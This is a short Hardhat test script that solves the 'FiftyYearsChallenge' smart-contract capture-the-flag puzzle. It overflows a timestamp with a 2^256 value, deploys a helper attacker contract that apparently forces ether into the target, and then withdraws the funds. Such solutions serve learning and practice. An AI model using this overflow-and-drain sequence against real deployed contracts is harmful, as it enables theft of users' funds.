const { expect } = require("chai");
const { buildContract } = require("../utils");

it("Solves FiftyYearsChallenge", async function () {
  const [attacker] = await ethers.getSigners();
  const contract = await buildContract("FiftyYearsChallenge", ethers.parseEther("1.0"), attacker);

  const ONE_DAY_IN_SECONDS = BigInt(24*60*60);
  console.log(await contract.head());
  await contract.upsert(1, 2n**256n - ONE_DAY_IN_SECONDS, {value: 1});
  console.log(await contract.head());

  await contract.upsert(2, 0, {value: 2});
  console.log(await contract.head());

  console.log(await contract.runner.provider.getBalance(await contract.getAddress()));
  console.log(await contract.head());

  const address = await contract.getAddress();
  await buildContract("FiftyYearsChallengeAttacker", 2, address);

  await contract.withdraw(2);

  expect(await contract.isComplete()).to.equal(true);
});
